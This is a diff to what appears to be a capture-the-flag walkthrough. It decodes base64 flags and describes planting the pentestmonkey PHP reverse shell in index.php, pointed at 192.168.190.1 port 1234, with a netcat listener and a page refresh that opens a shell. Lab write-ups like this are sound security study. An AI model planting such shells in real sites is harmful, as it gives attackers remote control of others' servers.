@@ -127,9 +127,16 @@ then
 $ echo VGhhaWxhbmQgRmxhZzogNmFkNzk2NWQxZTA1Y2E5OGIzZWZjNzZkYmY5ZmQ3MzM= | base64 -d
 Thailand Flag: 6ad7965d1e05ca98b3efc76dbf9fd733
 ==========================================================================================
-Then i edited the index.php and added php reverse shell on port 1234
-with 
+Then i edited the index.php by adding php reverse shell
+http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+and change those parameters to reconnect to your local machine 
+$ip = '192.168.190.1'; 
+$port = 1234;
+Then i updated the changes
+then started netcat in listening mode
 $ nc -lvp 1234
+Then refresh the index page and the shell session started
+
 then navigate to /srv/http
 $ cat reward_flag.txt
 TW9uZ29saWEgRmxhZzogNmI0OWMxM2NjY2Q5MTk0MGYwOWQ3OWUxNDIxMDgzOTQ=
